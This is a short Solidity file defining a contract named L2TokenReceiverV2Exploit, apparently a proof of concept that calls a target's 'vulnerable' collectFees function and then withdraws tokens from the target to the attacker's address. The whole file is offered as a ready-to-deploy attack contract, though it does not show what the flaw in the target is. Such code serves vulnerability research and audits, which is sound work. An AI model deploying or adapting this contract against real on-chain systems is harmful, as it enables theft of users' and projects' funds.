// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

interface IL2TokenReceiverV2 {
    function collectFees() external;
    function withdrawToken(address token, address to, uint256 amount) external;
}

contract L2TokenReceiverV2Exploit {
    IL2TokenReceiverV2 public target;
    address public attacker;

    constructor(address _target) {
        target = IL2TokenReceiverV2(_target);
        attacker = msg.sender;
    }

    function executeAttack() external {
        target.collectFees();  // Call the vulnerable function
    }

    function withdraw(address token, uint256 amount) external {
        require(msg.sender == attacker, "Only attacker can withdraw");
        target.withdrawToken(token, attacker, amount);
    }
}
